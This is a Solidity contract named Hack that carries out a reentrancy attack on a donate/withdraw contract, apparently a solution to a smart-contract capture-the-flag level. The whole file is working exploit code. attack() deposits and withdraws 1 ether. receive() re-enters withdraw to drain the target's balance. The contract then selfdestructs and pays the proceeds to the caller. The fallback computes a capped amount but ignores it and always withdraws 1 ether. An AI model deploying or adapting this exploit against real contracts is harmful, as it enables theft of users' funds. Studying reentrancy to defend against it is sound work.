// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

interface IReentrancy {
    function donate(address to) external payable;

    function withdraw(uint amount) external;
}

contract Hack {
    IReentrancy private immutable target;

    constructor(address _target) {
        target = IReentrancy(_target);
    }

    function attack() external payable {
        target.donate{value: 1 ether}(address(this));
        target.withdraw(1 ether);

        require(address(target).balance == 0, "balance is 0");
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {
        uint amount = 1 ether <= address(target).balance
            ? 1 ether
            : address(target).balance;
        if (amount > 0) {
            target.withdraw(1 ether);
        }
    }
}
